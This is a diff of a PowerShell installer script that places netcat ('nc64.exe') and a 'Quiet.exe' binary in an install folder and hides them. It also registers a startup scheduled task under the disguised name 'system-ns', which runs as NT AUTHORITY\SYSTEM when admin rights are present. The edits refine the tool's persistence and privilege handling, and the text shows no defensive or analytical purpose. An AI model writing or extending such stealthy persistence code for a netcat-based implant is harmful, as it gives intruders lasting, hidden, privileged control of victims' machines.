@@ -23,9 +23,6 @@ if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 }
 
-# Make the installation directory hidden
-attrib +H $installPath
-
 # File download paths
 $quietTxtPath = Join-Path $installPath "Quiet.exe"
 $nc64TxtPath = Join-Path $installPath "nc64.exe"
@@ -48,16 +45,28 @@ foreach ($file in $filesToHide) {
 
 # Create a scheduled task
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
-$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1)
-$trigger.Repetition = $(New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionDuration (New-TimeSpan -Hours 24) -RepetitionInterval (New-TimeSpan -Minutes 1)).Repetition
+$trigger = New-ScheduledTaskTrigger -AtStartup
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
 
 try {
-    # Register the task
-    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Settings $settings -Force
+    $taskName = "system-ns"
+
+    if ($isAdmin) {
+        # If admin rights, run as NT AUTHORITY\SYSTEM
+        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+
+        # Register the task with SYSTEM account
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
+    } else {
+        # If not admin, create the task with the current user's context
+        $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive
+
+        # Register the task with the current user's credentials
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -User $env:UserName -Force
+    }
 
     # Start the task immediately after registration
-    Start-ScheduledTask -TaskName "system-ns"
+    Start-ScheduledTask -TaskName $taskName
 
 } catch {
     Write-Output "Failed to register or start the scheduled task: $_"
